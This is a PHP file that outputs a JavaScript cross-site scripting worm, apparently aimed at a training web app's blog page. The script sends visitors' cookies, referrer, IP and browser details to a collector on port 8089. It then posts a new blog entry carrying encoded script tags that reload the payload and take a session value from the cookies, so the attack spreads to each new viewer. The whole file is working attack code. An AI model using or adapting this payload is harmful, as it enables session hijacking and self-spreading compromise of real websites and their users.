<?php
echo 'var messenger = new XMLHttpRequest();
messenger.open("POST", "http://localhost:8089", true);
messenger.send(document.cookie + "#" + document.referrer + "#" + window.location.protocol + "#" + userip + "#" + navigator.appName + "-" + navigator.product + "#" + navigator.platform + "#" + Date())

var postdata= "add-to-your-blog-php-submit-button=Save+Blog+Entry";
var blogentry = "&blog_entry=Gotcha!";
var ipscript = "%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22https%3A%2F%2Fl2.io%2Fip.js%3Fvar%3Duserip%22%3E%3C%2Fscript%3E";
var agentsmith = "%3Cscript%20type%3D%5C%22text%2Fjavascript%5C%22%20src%3D%5C%22http%3A%2F%2Flocalhost%2Fagentsmith.php%5C%22%3E%3C%2Fscript%3E";
var theCookies = document.cookie.split(";");
var csrf = "&csrf-token=";
var sessionid = theCookies[3];
postdata = postdata.concat(blogentry);
postdata = postdata.concat(ipscript);
postdata = postdata.concat(agentsmith);
postdata = postdata.concat(csrf);
postdata = postdata.concat(sessionid);

var http = new XMLHttpRequest();
http.open("POST", "index.php?page=add-to-your-blog.php", true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-length", postdata.length);
http.send(postdata);';
?>